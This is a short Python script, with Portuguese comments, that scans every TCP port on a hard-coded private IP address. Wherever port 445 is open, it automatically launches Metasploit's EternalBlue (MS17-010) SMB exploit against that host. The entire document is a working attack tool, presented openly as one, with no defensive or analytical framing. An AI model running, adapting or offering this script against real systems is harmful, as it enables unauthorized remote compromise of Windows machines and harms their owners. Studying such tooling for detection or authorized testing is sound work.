import socket
import os

def port_scan(target_ip):
    open_ports = []
    for port in range(1, 65535):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target_ip, port))
        if result == 0:
            open_ports.append(port)
        sock.close()
    return open_ports

def exploit_vulnerabilities(target_ip):
    open_ports = port_scan(target_ip)
    for port in open_ports:
        # Tentando exploração simples
        if port == 445:  # Exemplo: SMB Exploit
            os.system(f"msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOST {target_ip}; run'")

# Identifica a máquina alvo e executa
target_ip = "192.168.1.100"
exploit_vulnerabilities(target_ip)
